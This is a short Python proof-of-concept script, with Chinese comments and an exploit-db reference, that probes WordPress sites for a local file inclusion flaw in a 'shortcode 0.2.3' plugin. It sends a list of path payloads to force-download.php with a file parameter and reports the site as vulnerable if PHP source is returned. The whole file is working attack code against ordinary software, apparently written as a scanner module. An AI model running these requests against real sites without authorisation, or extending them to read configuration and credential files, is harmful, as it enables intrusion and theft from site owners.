#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wordpress 插件shortcode0.2.3 本地文件包含
referer: https://www.exploit-db.com/exploits/34436
author: Lucifer
description: 文件force-download.php参数file未过滤存在文件包含漏洞。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/force-download.php?file=force-download.php",
                    "/wp/wp-content/force-download.php?file=force-download.php",
                    "/wp-content/force-download.php?file=force-download.php",
                    "/wp-content/themes/ucin/includes/force-download.php?file=force-download.php",
                    "/wp-content/uploads/patientforms/force-download.php?file=force-download.php"] 
        try:
            for payload in payloads:
                vulnurl = url + payload
                req = requests.get(vulnurl, headers=headers, timeout=5, verify=False)
                if r"<?php" in req.text:
                    result[1]=  '存在'
                    result[0] = vulnurl
                    return result
            result[1]=  '不存在'
        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    